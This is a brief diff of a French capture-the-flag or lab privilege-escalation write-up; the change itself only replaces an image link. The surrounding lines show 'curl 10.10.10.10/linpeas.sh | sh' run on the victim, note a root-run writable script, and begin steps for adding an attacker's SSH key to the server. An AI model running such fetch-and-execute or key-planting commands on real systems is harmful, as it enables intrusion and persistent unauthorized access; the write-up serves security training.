@@ -123,7 +123,7 @@ curl 10.10.10.10/linpeas.sh | sh #Victim
 Nous pouvons voir que root a accédé à ce fichier: «/usr/bin/timer_backup.sh». Qui appartient à votre utilisateur et est accessible en écriture et writeable.
 
 
-![ak](https://media.discordapp.net/attachments/490431433559506954/832944544067878932/unknown.png)
+![ak](https://media.discordapp.net/attachments/490431433559506954/834009494190817280/unknown.png)
 
 
 Vous devez créer votre clé ssh, ajouter notre clé publique SSH au fichier allowed_keys sur le serveur. Pour ce faire, suivez les commandes suivants :
